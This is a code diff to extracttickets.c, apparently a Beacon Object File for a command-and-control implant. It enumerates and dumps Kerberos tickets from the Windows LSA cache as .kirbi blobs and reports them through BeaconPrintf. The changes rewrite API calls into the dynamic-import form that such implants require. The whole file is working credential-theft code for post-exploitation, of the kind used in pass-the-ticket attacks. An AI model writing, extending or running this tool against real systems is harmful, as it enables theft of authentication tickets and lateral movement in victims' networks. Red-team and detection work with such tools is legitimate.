@@ -2,8 +2,8 @@
  * extracttickets.c — Extract Kerberos tickets from LSA cache
  *
  * Uses secur32.dll:
- *   LsaConnectUntrusted → LsaLookupAuthenticationPackage("Kerberos")
- *   → LsaCallAuthenticationPackage(KERB_RETRIEVE_TKT_REQUEST)
+ *   LsaConnectUntrusted -> LsaLookupAuthenticationPackage("Kerberos")
+ *   -> LsaCallAuthenticationPackage(KERB_RETRIEVE_TKT_REQUEST)
  *
  * First enumerates tickets (KERB_QUERY_TKT_CACHE_EX_REQUEST),
  * then retrieves each one as a full .kirbi blob.
@@ -20,6 +20,10 @@ DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
     HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
 DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
 DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);
+
+DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
+
+DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);
 
 /* KERB_PROTOCOL_MESSAGE_TYPE */
 #define KerbQueryTicketCacheExMessage    14
@@ -117,7 +121,7 @@ void go(char *args, int args_len) {
     LUID targetLuid = {0};
     if (luid_str && *luid_str) {
         ULONGLONG val = 0;
-        sscanf(luid_str, "%llx", &val);
+        MSVCRT$sscanf(luid_str, "%llx", &val);
         targetLuid.LowPart = (DWORD)(val & 0xFFFFFFFF);
         targetLuid.HighPart = (LONG)(val >> 32);
     }
@@ -154,7 +158,7 @@ void go(char *args, int args_len) {
         if (service_filter && *service_filter) {
             /* Convert ServerName to ANSI for comparison */
             char serverName[256] = {0};
-            WideCharToMultiByte(CP_UTF8, 0,
+            KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                 tickets[i].ServerName.Buffer, tickets[i].ServerName.Length / 2,
                 serverName, 255, NULL, NULL);
             if (strstr(serverName, service_filter) == NULL)
@@ -164,13 +168,13 @@ void go(char *args, int args_len) {
         /* Print ticket info */
         char clientName[256] = {0}, serverName[256] = {0};
         char clientRealm[256] = {0}, serverRealm[256] = {0};
-        WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientName.Buffer,
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientName.Buffer,
             tickets[i].ClientName.Length / 2, clientName, 255, NULL, NULL);
-        WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerName.Buffer,
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerName.Buffer,
             tickets[i].ServerName.Length / 2, serverName, 255, NULL, NULL);
-        WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientRealm.Buffer,
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ClientRealm.Buffer,
             tickets[i].ClientRealm.Length / 2, clientRealm, 255, NULL, NULL);
-        WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerRealm.Buffer,
+        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, tickets[i].ServerRealm.Buffer,
             tickets[i].ServerRealm.Length / 2, serverRealm, 255, NULL, NULL);
 
         BeaconPrintf(CALLBACK_OUTPUT,
